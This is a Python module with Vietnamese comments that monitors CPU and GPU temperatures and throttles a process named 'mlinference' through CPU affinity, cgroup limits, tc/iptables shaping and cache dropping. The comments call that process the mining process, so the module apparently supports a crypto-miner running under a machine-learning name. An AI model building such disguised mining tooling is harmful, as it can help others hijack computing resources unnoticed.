# temperature_monitor.py

import os
from pathlib import Path
import psutil
import pynvml
import subprocess
import threading
import time
from typing import List, Optional

# Import hàm setup_logging từ logging_config.py
from logging_config import setup_logging

# Thiết lập đường dẫn tới thư mục logs
LOGS_DIR = Path(os.getenv('LOGS_DIR', '/app/mining_environment/logs'))
os.makedirs(LOGS_DIR, exist_ok=True)

# Thiết lập logging với logging_config.py
logger = setup_logging('temperature_monitor', LOGS_DIR / 'temperature_monitor.log', 'INFO')


class TemperatureMonitor:
    """
    TemperatureMonitor là một singleton class chịu trách nhiệm giám sát nhiệt độ của CPU và GPU.
    Nó cung cấp các phương thức để lấy nhiệt độ hiện tại và quản lý các tham số liên quan đến nhiệt độ.
    """

    _instance = None
    _lock = threading.Lock()

    def __new__(cls):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super(TemperatureMonitor, cls).__new__(cls)
                cls._instance._initialized = False
        return cls._instance

    def __init__(self):
        if self._initialized:
            return
        self._initialized = True

        # Initialize NVML for GPU temperature monitoring
        try:
            pynvml.nvmlInit()
            self.gpu_count = pynvml.nvmlDeviceGetCount()
            logger.info(f"NVML initialized successfully. Số lượng GPU: {self.gpu_count}")
        except pynvml.NVMLError as e:
            logger.error(f"Không thể khởi tạo NVML: {e}")
            self.gpu_count = 0

        # Lock for thread-safe operations
        self.monitor_lock = threading.Lock()

        # Cache limit percentage
        self.cache_limit_percent = 70  # Default value, có thể được cập nhật qua set_cache_limit

    def get_cpu_temperature(self, pid: Optional[int] = None) -> Optional[float]:
        """
        Lấy nhiệt độ hiện tại của CPU.
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Args:
            pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

        Returns:
            Optional[float]: Nhiệt độ CPU hiện tại (°C) hoặc None nếu không thể lấy.
        """
        try:
            temps = psutil.sensors_temperatures()
            if not temps:
                logger.warning("Không tìm thấy cảm biến nhiệt độ CPU.")
                return None

            # Tìm kiếm cảm biến CPU (có thể là 'coretemp' hoặc tương tự)
            for name, entries in temps.items():
                if 'coretemp' in name.lower() or 'cpu' in name.lower():
                    for entry in entries:
                        if entry.label in ('Package id 0', 'Core 0', 'Core 1', 'Core 2', 'Core 3'):
                            logger.debug(f"Nhiệt độ CPU ({entry.label}): {entry.current}°C")
                            return entry.current
            logger.warning("Không tìm thấy nhãn nhiệt độ CPU phù hợp.")
            return None
        except Exception as e:
            logger.error(f"Lỗi khi lấy nhiệt độ CPU: {e}")
            return None

    def get_gpu_temperature(self, pid: Optional[int] = None) -> List[float]:
        """
        Lấy nhiệt độ hiện tại của từng GPU.
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Args:
            pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

        Returns:
            List[float]: Danh sách nhiệt độ GPU hiện tại (°C).
        """
        gpu_temps = []
        if self.gpu_count == 0:
            logger.warning("Không có GPU nào được phát hiện để giám sát nhiệt độ.")
            return gpu_temps

        try:
            for i in range(self.gpu_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                temp = pynvml.nvmlDeviceGetTemperature(handle, pynvml.NVML_TEMPERATURE_GPU)
                gpu_temps.append(temp)
                logger.debug(f"GPU {i} Temperature: {temp}°C")
            return gpu_temps
        except pynvml.NVMLError as e:
            logger.error(f"Lỗi khi lấy nhiệt độ GPU: {e}")
            return gpu_temps
        except Exception as e:
            logger.error(f"Lỗi không mong muốn khi lấy nhiệt độ GPU: {e}")
            return gpu_temps

    def get_current_cpu_threads(self, pid: Optional[int] = None) -> int:
        """
        Lấy số lượng CPU threads hiện tại được gán cho tiến trình khai thác.
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Args:
            pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

        Returns:
            int: Số lượng CPU threads.
        """
        try:
            proc = self._find_mining_process()
            if proc:
                affinity = proc.cpu_affinity()
                num_threads = len(affinity)
                logger.debug(f"Số lượng CPU threads hiện tại cho tiến trình 'mlinference': {num_threads}")
                return num_threads
            else:
                logger.warning("Không tìm thấy tiến trình 'mlinference'.")
                return 0
        except Exception as e:
            logger.error(f"Lỗi khi lấy số lượng CPU threads: {e}")
            return 0

    def set_cpu_threads(self, new_threads: int, pid: Optional[int] = None):
        """
        Gán số lượng CPU threads cho tiến trình khai thác.
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Args:
            new_threads (int): Số lượng CPU threads mới.
            pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).
        """
        try:
            proc = self._find_mining_process()
            if proc:
                total_cores = psutil.cpu_count(logical=True)
                if new_threads > total_cores:
                    logger.warning(f"Số lượng threads mới ({new_threads}) vượt quá số lõi CPU ({total_cores}). Đặt lại thành {total_cores}.")
                    new_threads = total_cores

                # Chọn các CPU cores đầu tiên để gán
                new_affinity = list(range(new_threads))
                proc.cpu_affinity(new_affinity)
                logger.info(f"Đã gán tiến trình 'mlinference' (PID: {proc.pid}) vào các CPU cores: {new_affinity}")
            else:
                logger.warning("Không tìm thấy tiến trình 'mlinference' để gán CPU threads.")
        except Exception as e:
            logger.error(f"Lỗi khi gán CPU threads: {e}")

    def get_current_ram_allocation(self, pid: Optional[int] = None) -> Optional[int]:
        """
        Lấy lượng RAM hiện tại được cấp phát cho tiến trình khai thác (MB).
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Args:
            pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

        Returns:
            Optional[int]: Lượng RAM hiện tại (MB) hoặc None nếu không thể lấy.
        """
        try:
            proc = self._find_mining_process()
            if proc:
                mem_info = proc.memory_info()
                ram_mb = mem_info.rss / (1024 * 1024)
                logger.debug(f"Lượng RAM hiện tại cho tiến trình 'mlinference': {ram_mb} MB")
                return int(ram_mb)
            else:
                logger.warning("Không tìm thấy tiến trình 'mlinference' để lấy RAM allocation.")
                return None
        except Exception as e:
            logger.error(f"Lỗi khi lấy RAM allocation: {e}")
            return None

    def set_ram_allocation(self, new_ram_mb: int, pid: Optional[int] = None):
        """
        Thiết lập lượng RAM được cấp phát cho tiến trình khai thác.
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Args:
            new_ram_mb (int): Lượng RAM mới (MB).
            pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).
        """
        try:
            proc = self._find_mining_process()
            if proc:
                # Sử dụng cgroups để giới hạn RAM nếu đã được thiết lập
                cgroup_path = f"/sys/fs/cgroup/memory/mlinference/{proc.pid}/memory.limit_in_bytes"
                if Path(cgroup_path).exists():
                    new_limit_bytes = new_ram_mb * 1024 * 1024
                    with open(cgroup_path, 'w') as f:
                        f.write(str(new_limit_bytes))
                    logger.info(f"Đã thiết lập giới hạn RAM cho tiến trình 'mlinference' thành {new_ram_mb} MB.")
                else:
                    logger.warning(f"Cgroup RAM không được thiết lập cho tiến trình 'mlinference'. Không thể giới hạn RAM.")
            else:
                logger.warning("Không tìm thấy tiến trình 'mlinference' để thiết lập RAM allocation.")
        except PermissionError:
            logger.error("Không có quyền để thiết lập RAM allocation thông qua cgroup.")
        except Exception as e:
            logger.error(f"Lỗi khi thiết lập RAM allocation: {e}")

    def get_current_gpu_usage(self, pid: Optional[int] = None) -> List[float]:
        """
        Lấy mức sử dụng GPU hiện tại (phần trăm).
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Args:
            pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

        Returns:
            List[float]: Danh sách mức sử dụng GPU hiện tại (%).
        """
        gpu_usages = []
        if self.gpu_count == 0:
            logger.warning("Không có GPU nào được phát hiện để giám sát mức sử dụng.")
            return gpu_usages

        try:
            for i in range(self.gpu_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                utilization = pynvml.nvmlDeviceGetUtilizationRates(handle).gpu
                gpu_usages.append(utilization)
                logger.debug(f"GPU {i} Utilization: {utilization}%")
            return gpu_usages
        except pynvml.NVMLError as e:
            logger.error(f"Lỗi khi lấy mức sử dụng GPU: {e}")
            return gpu_usages
        except Exception as e:
            logger.error(f"Lỗi không mong muốn khi lấy mức sử dụng GPU: {e}")
            return gpu_usages

    def get_current_disk_io_limit(self, pid: Optional[int] = None) -> Optional[float]:
        """
        Lấy giới hạn Disk I/O hiện tại (Mbps).
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Returns:
            Optional[float]: Giới hạn Disk I/O hiện tại (Mbps) hoặc None nếu không thể lấy.
        """
        try:
            # Giả sử sử dụng cgroups blkio để lấy giới hạn Disk I/O
            cgroup_path_read = f"/sys/fs/cgroup/blkio/mlinference/{pid}/blkio.throttle.read_bps_device" if pid else None
            cgroup_path_write = f"/sys/fs/cgroup/blkio/mlinference/{pid}/blkio.throttle.write_bps_device" if pid else None

            read_limit = None
            write_limit = None

            if cgroup_path_read and Path(cgroup_path_read).exists():
                with open(cgroup_path_read, 'r') as f:
                    content = f.read().strip()
                    # Giả định định dạng: "8:0 1048576" => major:minor limit
                    parts = content.split()
                    if len(parts) == 2:
                        read_limit = int(parts[1]) * 8 / (1024 * 1024)  # Convert bytes/s to Mbps

            if cgroup_path_write and Path(cgroup_path_write).exists():
                with open(cgroup_path_write, 'r') as f:
                    content = f.read().strip()
                    parts = content.split()
                    if len(parts) == 2:
                        write_limit = int(parts[1]) * 8 / (1024 * 1024)  # Convert bytes/s to Mbps

            if read_limit is not None and write_limit is not None:
                logger.debug(f"Giới hạn Disk I/O hiện tại: Đọc {read_limit} Mbps, Ghi {write_limit} Mbps")
                return max(read_limit, write_limit)
            elif read_limit is not None:
                logger.debug(f"Giới hạn Disk I/O hiện tại: Đọc {read_limit} Mbps")
                return read_limit
            elif write_limit is not None:
                logger.debug(f"Giới hạn Disk I/O hiện tại: Ghi {write_limit} Mbps")
                return write_limit
            else:
                logger.warning("Không thể lấy giới hạn Disk I/O thông qua cgroup blkio.")
                return None
        except subprocess.CalledProcessError as e:
            logger.error(f"Lỗi khi lấy giới hạn Disk I/O: {e}")
            return None
        except ValueError:
            logger.error("Không thể phân tích giới hạn Disk I/O từ nội dung cgroup blkio.")
            return None
        except Exception as e:
            logger.error(f"Lỗi không mong muốn khi lấy giới hạn Disk I/O: {e}")
            return None

    def set_disk_io_limit(self, new_disk_io_mbps: float, pid: Optional[int] = None):
        """
        Thiết lập giới hạn Disk I/O cho tiến trình khai thác.
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Args:
            new_disk_io_mbps (float): Giới hạn Disk I/O mới (Mbps).
            pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).
        """
        try:
            proc = self._find_mining_process()
            if proc:
                pid = proc.pid  # Sử dụng PID từ tiến trình nếu chưa được cung cấp
                # Sử dụng cgroups blkio để giới hạn Disk I/O
                # Cần biết major:minor number của thiết bị Disk
                # Giả sử thiết bị Disk là /dev/sda với major 8 và minor 0
                # Cần điều chỉnh theo hệ thống thực tế
                device_major = 8
                device_minor = 0
                read_limit_bytes = int(new_disk_io_mbps * 1024 * 1024 / 8)  # Mbps to bytes per second
                write_limit_bytes = int(new_disk_io_mbps * 1024 * 1024 / 8)

                # Thiết lập giới hạn đọc
                cgroup_path_read = f"/sys/fs/cgroup/blkio/mlinference/{pid}/blkio.throttle.read_bps_device"
                cgroup_path_write = f"/sys/fs/cgroup/blkio/mlinference/{pid}/blkio.throttle.write_bps_device"

                # Đảm bảo cgroup blkio đã được tạo cho tiến trình
                os.makedirs(f"/sys/fs/cgroup/blkio/mlinference/{pid}", exist_ok=True)

                with open(cgroup_path_read, 'w') as f:
                    f.write(f"{device_major}:{device_minor} {read_limit_bytes}\n")
                with open(cgroup_path_write, 'w') as f:
                    f.write(f"{device_major}:{device_minor} {write_limit_bytes}\n")

                logger.info(f"Đã thiết lập giới hạn Disk I/O cho tiến trình 'mlinference' thành {new_disk_io_mbps} Mbps.")
            else:
                logger.warning("Không tìm thấy tiến trình 'mlinference' để thiết lập Disk I/O limit.")
        except PermissionError:
            logger.error("Không có quyền để thiết lập Disk I/O limit thông qua cgroup.")
        except Exception as e:
            logger.error(f"Lỗi khi thiết lập Disk I/O limit: {e}")

    def get_current_network_bandwidth_limit(self, pid: Optional[int] = None) -> Optional[float]:
        """
        Lấy giới hạn băng thông mạng hiện tại (Mbps).
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Returns:
            Optional[float]: Giới hạn băng thông mạng hiện tại (Mbps) hoặc None nếu không thể lấy.
        """
        try:
            network_interface = 'eth0'  # Có thể lấy từ cấu hình hoặc tham số
            class_id = '1:12'
            # Sử dụng tc để lấy thông tin băng thông mạng
            result = subprocess.check_output(['tc', 'class', 'show', 'dev', network_interface, 'parent', '1:0'], stderr=subprocess.STDOUT)
            classes = result.decode().split('\n')
            for cls in classes:
                if class_id in cls:
                    tokens = cls.split()
                    rate_index = tokens.index('rate')
                    bw_str = tokens[rate_index + 1]
                    if 'mbit' in bw_str:
                        bw_mbps = float(bw_str.replace('mbit', ''))
                        logger.debug(f"Giới hạn băng thông mạng hiện tại: {bw_mbps} Mbps")
                        return bw_mbps
            logger.warning(f"Không tìm thấy class {class_id} trong qdisc HTB của giao diện {network_interface}.")
            return None
        except subprocess.CalledProcessError as e:
            logger.error(f"Lỗi khi lấy giới hạn băng thông mạng: {e}")
            return None
        except ValueError:
            logger.error("Không thể phân tích băng thông mạng từ output của tc.")
            return None
        except Exception as e:
            logger.error(f"Lỗi không mong muốn khi lấy giới hạn băng thông mạng: {e}")
            return None

    def set_network_bandwidth_limit(self, new_network_bw_mbps: float, pid: Optional[int] = None):
        """
        Thiết lập giới hạn băng thông mạng cho giao diện eth0.
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Args:
            new_network_bw_mbps (float): Giới hạn băng thông mạng mới (Mbps).
            pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).
        """
        try:
            network_interface = 'eth0'  # Có thể lấy từ cấu hình hoặc tham số
            class_id = '1:12'
            # Thêm qdisc HTB nếu chưa tồn tại
            try:
                existing_qdiscs = subprocess.check_output(['tc', 'qdisc', 'show', 'dev', network_interface]).decode()
                if 'htb' not in existing_qdiscs:
                    subprocess.run([
                        'tc', 'qdisc', 'add', 'dev', network_interface, 'root', 'handle', '1:0', 'htb',
                        'default', '12'
                    ], check=True)
                    logger.info(f"Thêm qdisc HTB trên {network_interface}")
            except subprocess.CalledProcessError:
                # Giả sử HTB đã được thêm trước đó
                logger.info(f"qdisc HTB đã tồn tại trên {network_interface}")

            # Thêm hoặc cập nhật class với giới hạn băng thông
            try:
                existing_classes = subprocess.check_output(['tc', 'class', 'show', 'dev', network_interface, 'parent', '1:0']).decode()
                if class_id not in existing_classes:
                    subprocess.run([
                        'tc', 'class', 'add', 'dev', network_interface, 'parent', '1:0', 'classid', class_id,
                        'htb', 'rate', f"{new_network_bw_mbps}mbit"
                    ], check=True)
                    logger.info(f"Thêm class {class_id} với rate {new_network_bw_mbps} Mbps trên {network_interface}")
                else:
                    # Cập nhật rate của class
                    subprocess.run([
                        'tc', 'class', 'change', 'dev', network_interface, 'parent', '1:0', 'classid', class_id,
                        'htb', 'rate', f"{new_network_bw_mbps}mbit"
                    ], check=True)
                    logger.info(f"Cập nhật class {class_id} với rate {new_network_bw_mbps} Mbps trên {network_interface}")
            except subprocess.CalledProcessError as e:
                logger.error(f"Lỗi khi thêm hoặc cập nhật class {class_id}: {e}")
                return

            # Thêm hoặc cập nhật filter để gán các gói liên quan đến 'mlinference' vào class 1:12
            try:
                # Sử dụng iptables để đánh dấu các gói từ tiến trình 'mlinference'
                # Giả sử tiến trình 'mlinference' sử dụng một port cụ thể, ví dụ: 12345
                # Cần điều chỉnh theo thực tế

                # Thiết lập iptables để đánh dấu các gói từ tiến trình 'mlinference'
                # Trước tiên, thêm quy tắc để đánh dấu các gói
                subprocess.run([
                    'iptables', '-t', 'mangle', '-A', 'OUTPUT', '-p', 'tcp', '--sport', '12345', '-j', 'MARK', '--set-mark', '12'
                ], check=True)
                logger.info("Đã thiết lập iptables để đánh dấu các gói từ 'mlinference' vào mark 12.")

                # Thêm filter tc để gán các gói đã đánh dấu vào class 1:12
                existing_filters = subprocess.check_output(['tc', 'filter', 'show', 'dev', network_interface, 'parent', '1:0']).decode()
                if 'fw flowid 1:12' not in existing_filters:
                    subprocess.run([
                        'tc', 'filter', 'add', 'dev', network_interface, 'parent', '1:0', 'protocol', 'ip',
                        'handle', '12', 'fw', 'flowid', '1:12'
                    ], check=True)
                    logger.info("Đã thêm filter tc để gán các gói đánh dấu vào class 1:12.")
                else:
                    logger.info("Filter tc đã tồn tại cho mark 12 trên giao diện mạng.")
            except subprocess.CalledProcessError as e:
                logger.error(f"Lỗi khi thiết lập filter tc: {e}")
            except Exception as e:
                logger.error(f"Lỗi không mong muốn khi thiết lập filter tc: {e}")

            logger.info(f"Giới hạn băng thông mạng cho giao diện {network_interface} đã được thiết lập thành {new_network_bw_mbps} Mbps.")
        except subprocess.CalledProcessError as e:
            logger.error(f"Lỗi khi thiết lập giới hạn băng thông mạng: {e}")
        except Exception as e:
            logger.error(f"Lỗi không mong muốn khi thiết lập giới hạn băng thông mạng: {e}")

    def get_current_cache_limit(self, pid: Optional[int] = None) -> Optional[float]:
        """
        Lấy giới hạn Cache hiện tại (phần trăm).
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Returns:
            Optional[float]: Giới hạn Cache hiện tại (%) hoặc None nếu không thể lấy.
        """
        try:
            # Giả sử giới hạn cache được lưu trong một biến nội bộ hoặc cấu hình
            # Có thể đọc từ một tệp cấu hình hoặc từ các tham số hệ thống
            # Ở đây, trả về giá trị hiện tại của self.cache_limit_percent
            logger.debug(f"Giới hạn Cache hiện tại: {self.cache_limit_percent}%")
            return self.cache_limit_percent
        except Exception as e:
            logger.error(f"Lỗi khi lấy giới hạn Cache: {e}")
            return None

    def set_cache_limit(self, new_cache_limit_percent: float, pid: Optional[int] = None):
        """
        Thiết lập giới hạn Cache (phần trăm).
        Tham số `pid` được thêm vào để tương thích với system_manager.py, nhưng hiện tại không được sử dụng.

        Args:
            new_cache_limit_percent (float): Giới hạn Cache mới (%).
            pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).
        """
        try:
            if not (0 < new_cache_limit_percent <= 100):
                logger.error("Giới hạn Cache phải trong khoảng (0, 100].")
                return

            self.cache_limit_percent = new_cache_limit_percent
            # Thực hiện hành động để đảm bảo Cache không vượt quá giới hạn
            # Ví dụ: Drop caches nếu hiện tại cache vượt quá giới hạn
            current_cache = self._get_system_cache_percent()
            if current_cache and current_cache > self.cache_limit_percent:
                self._drop_caches()
                logger.info(f"Đã drop caches để duy trì giới hạn Cache ở mức {self.cache_limit_percent}%.")
            else:
                logger.info(f"Giới hạn Cache đã được thiết lập thành công: {self.cache_limit_percent}%.")
        except Exception as e:
            logger.error(f"Lỗi khi thiết lập giới hạn Cache: {e}")

    def _get_system_cache_percent(self) -> Optional[float]:
        """
        Lấy phần trăm Cache hiện tại của hệ thống.

        Returns:
            Optional[float]: Phần trăm Cache hiện tại (%) hoặc None nếu không thể lấy.
        """
        try:
            mem = psutil.virtual_memory()
            cache_percent = mem.cached / mem.total * 100
            logger.debug(f"Cache hiện tại: {cache_percent:.2f}%")
            return cache_percent
        except Exception as e:
            logger.error(f"Lỗi khi lấy phần trăm Cache: {e}")
            return None

    def _drop_caches(self):
        """
        Drop Cache của hệ thống.
        Yêu cầu quyền root.
        """
        try:
            with open('/proc/sys/vm/drop_caches', 'w') as f:
                f.write('3\n')  # Drop pagecache, dentries và inodes
            logger.info("Đã drop caches thành công.")
        except PermissionError:
            logger.error("Không có quyền để drop caches. Thi hành không thành công.")
        except Exception as e:
            logger.error(f"Lỗi khi drop caches: {e}")

    def _find_mining_process(self) -> Optional[psutil.Process]:
        """
        Tìm tiến trình khai thác 'mlinference'.

        Returns:
            Optional[psutil.Process]: Đối tượng tiến trình hoặc None nếu không tìm thấy.
        """
        try:
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] == 'mlinference':
                    logger.debug(f"Tiến trình 'mlinference' được tìm thấy: PID {proc.pid}")
                    return proc
            logger.debug("Không tìm thấy tiến trình 'mlinference'.")
            return None
        except Exception as e:
            logger.error(f"Lỗi khi tìm tiến trình 'mlinference': {e}")
            return None

    def setup_temperature_monitoring(self):
        """
        Thiết lập giám sát nhiệt độ bằng cách khởi động các tiến trình hoặc threads cần thiết.
        Được gọi bởi setup_env.py.
        """
        try:
            # Nếu cần thiết, có thể khởi động các tiến trình giám sát bổ sung tại đây
            logger.info("Đã thiết lập giám sát nhiệt độ.")
        except Exception as e:
            logger.error(f"Lỗi khi thiết lập giám sát nhiệt độ: {e}")

    def shutdown(self):
        """
        Dừng giám sát nhiệt độ và giải phóng tài nguyên.
        """
        try:
            if self.gpu_count > 0:
                pynvml.nvmlShutdown()
                logger.info("NVML đã được shutdown thành công.")
        except pynvml.NVMLError as e:
            logger.error(f"Lỗi khi shutdown NVML: {e}")
        except Exception as e:
            logger.error(f"Lỗi không mong muốn khi shutdown NVML: {e}")


# Singleton instance of TemperatureMonitor
_temperature_monitor_instance = TemperatureMonitor()

def setup_temperature_monitoring():
    """
    Hàm để thiết lập giám sát nhiệt độ.
    Được gọi bởi setup_env.py.
    """
    _temperature_monitor_instance.setup_temperature_monitoring()

def get_cpu_temperature(pid: Optional[int] = None) -> Optional[float]:
    """
    Hàm để lấy nhiệt độ CPU hiện tại.
    Được gọi bởi system_manager.py.

    Args:
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

    Returns:
        Optional[float]: Nhiệt độ CPU hiện tại (°C) hoặc None nếu không thể lấy.
    """
    return _temperature_monitor_instance.get_cpu_temperature(pid)

def get_gpu_temperature(pid: Optional[int] = None) -> List[float]:
    """
    Hàm để lấy nhiệt độ GPU hiện tại.
    Được gọi bởi system_manager.py.

    Args:
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

    Returns:
        List[float]: Danh sách nhiệt độ GPU hiện tại (°C).
    """
    return _temperature_monitor_instance.get_gpu_temperature(pid)

def get_current_cpu_threads(pid: Optional[int] = None) -> int:
    """
    Hàm để lấy số lượng CPU threads hiện tại được gán cho tiến trình khai thác.
    Được gọi bởi system_manager.py.

    Args:
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

    Returns:
        int: Số lượng CPU threads.
    """
    return _temperature_monitor_instance.get_current_cpu_threads(pid)

def set_cpu_threads(new_threads: int, pid: Optional[int] = None):
    """
    Hàm để gán số lượng CPU threads cho tiến trình khai thác.
    Được gọi bởi system_manager.py.

    Args:
        new_threads (int): Số lượng CPU threads mới.
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).
    """
    _temperature_monitor_instance.set_cpu_threads(new_threads, pid)

def get_current_ram_allocation(pid: Optional[int] = None) -> Optional[int]:
    """
    Hàm để lấy lượng RAM hiện tại được cấp phát cho tiến trình khai thác.
    Được gọi bởi system_manager.py.

    Args:
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

    Returns:
        Optional[int]: Lượng RAM hiện tại (MB) hoặc None nếu không thể lấy.
    """
    return _temperature_monitor_instance.get_current_ram_allocation(pid)

def set_ram_allocation(new_ram_mb: int, pid: Optional[int] = None):
    """
    Hàm để thiết lập lượng RAM được cấp phát cho tiến trình khai thác.
    Được gọi bởi system_manager.py.

    Args:
        new_ram_mb (int): Lượng RAM mới (MB).
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).
    """
    _temperature_monitor_instance.set_ram_allocation(new_ram_mb, pid)

def get_current_gpu_usage(pid: Optional[int] = None) -> List[float]:
    """
    Hàm để lấy mức sử dụng GPU hiện tại.
    Được gọi bởi system_manager.py.

    Args:
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

    Returns:
        List[float]: Danh sách mức sử dụng GPU hiện tại (%).
    """
    return _temperature_monitor_instance.get_current_gpu_usage(pid)

def get_current_disk_io_limit(pid: Optional[int] = None) -> Optional[float]:
    """
    Hàm để lấy giới hạn Disk I/O hiện tại.
    Được gọi bởi system_manager.py.

    Args:
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

    Returns:
        Optional[float]: Giới hạn Disk I/O hiện tại (Mbps) hoặc None nếu không thể lấy.
    """
    return _temperature_monitor_instance.get_current_disk_io_limit(pid)

def set_disk_io_limit(new_disk_io_mbps: float, pid: Optional[int] = None):
    """
    Hàm để thiết lập giới hạn Disk I/O.
    Được gọi bởi system_manager.py.

    Args:
        new_disk_io_mbps (float): Giới hạn Disk I/O mới (Mbps).
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).
    """
    _temperature_monitor_instance.set_disk_io_limit(new_disk_io_mbps, pid)

def get_current_network_bandwidth_limit(pid: Optional[int] = None) -> Optional[float]:
    """
    Hàm để lấy giới hạn băng thông mạng hiện tại.
    Được gọi bởi system_manager.py.

    Args:
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

    Returns:
        Optional[float]: Giới hạn băng thông mạng hiện tại (Mbps) hoặc None nếu không thể lấy.
    """
    return _temperature_monitor_instance.get_current_network_bandwidth_limit(pid)

def set_network_bandwidth_limit(new_network_bw_mbps: float, pid: Optional[int] = None):
    """
    Hàm để thiết lập giới hạn băng thông mạng.
    Được gọi bởi system_manager.py.

    Args:
        new_network_bw_mbps (float): Giới hạn băng thông mạng mới (Mbps).
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).
    """
    _temperature_monitor_instance.set_network_bandwidth_limit(new_network_bw_mbps, pid)

def get_current_cache_limit(pid: Optional[int] = None) -> Optional[float]:
    """
    Hàm để lấy giới hạn Cache hiện tại.
    Được gọi bởi system_manager.py.

    Args:
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).

    Returns:
        Optional[float]: Giới hạn Cache hiện tại (%) hoặc None nếu không thể lấy.
    """
    return _temperature_monitor_instance.get_current_cache_limit(pid)

def set_cache_limit(new_cache_limit_percent: float, pid: Optional[int] = None):
    """
    Hàm để thiết lập giới hạn Cache.
    Được gọi bởi system_manager.py.

    Args:
        new_cache_limit_percent (float): Giới hạn Cache mới (%).
        pid (Optional[int]): PID của tiến trình (không được sử dụng hiện tại).
    """
    _temperature_monitor_instance.set_cache_limit(new_cache_limit_percent, pid)

def shutdown_temperature_monitoring():
    """
    Hàm để dừng giám sát nhiệt độ và giải phóng tài nguyên.
    Được gọi khi hệ thống dừng lại.
    """
    _temperature_monitor_instance.shutdown()
